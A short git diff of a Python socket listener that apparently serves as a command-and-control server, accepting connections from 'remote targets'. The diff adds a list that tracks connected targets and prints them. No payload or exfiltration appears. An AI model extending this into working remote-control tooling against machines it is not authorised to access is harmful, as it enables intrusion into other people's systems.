@@ -14,6 +14,10 @@ def listen_handler():
     print('[+] Awaiting connection from client...')
     sock.listen()
     remote_target, remote_ip = sock.accept()
+    targets.append([remote_target, remote_ip])
+    print(targets)
+    print((targets[0])[0])
+    print((targets[0])[1])
     comm_handler(remote_target, remote_ip)
 
 def comm_handler(remote_target, remote_ip):
@@ -47,6 +51,7 @@ def comm_handler(remote_target, remote_ip):
 
 # Binds host ip and port to the socket and begins listening for a connection
 if __name__ == '__main__':
+    targets = []
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         host_ip = sys.argv[1] 
